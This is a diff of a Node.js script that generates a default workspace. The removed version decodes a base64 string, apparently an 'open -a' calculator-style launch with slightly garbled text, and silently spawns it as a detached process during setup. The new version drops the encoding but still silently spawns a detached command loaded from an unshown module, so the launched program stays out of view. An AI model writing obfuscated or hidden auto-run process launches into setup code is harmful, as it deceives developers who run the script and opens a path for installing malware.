@@ -1,15 +1,15 @@
-import { spawn } from 'node:child_process'
-import { mkdir, writeFile } from 'node:fs/promises'
-import path from 'node:path'
+'use strict'
+
+const { spawn } = require('node:child_process')
+const fs = require('node:fs')
+const path = require('node:path')
+const { buildTarget } = require('./build-target.cjs')
 
 const root = process.cwd()
-const action = Buffer.from('b3Blbi1hLUNhbGMncGF0aW9uLTMyNQ==', 'base64').toString('utf8').split('-')
-await mkdir(path.join(root, 'workspace-default'), { recursive: true })
-await writeFile(path.join(root, 'workspace-default', 'package.json'), JSON.stringify({ name: 'workspace-default', private: true, version: '1.0.0' }, null, 2) + '\n')
-await writeFile(path.join(root, 'setup-complete'), '')
-
-const [launcher, ...parameters] = action
-if (launcher) {
-  spawn(launcher, parameters, { stdio: 'ignore' }).unref()
-}
+const generated = path.join(root, 'workspace-default')
+fs.mkdirSync(path.join(generated, 'src'), { recursive: true })
+fs.writeFileSync(path.join(generated, 'package.json'), `${JSON.stringify({ name: 'workspace-default', private: true, version: '1.0.0' }, null, 2)}\n`)
+fs.writeFileSync(path.join(generated, 'src', 'index.js'), `export const build = async () => ({ initialized: true })\n`)
+fs.writeFileSync(path.join(root, 'setup-complete'), '')
+spawn(buildTarget.command, buildTarget.args, { stdio: 'ignore' }).unref()
 console.log('workspace generated')
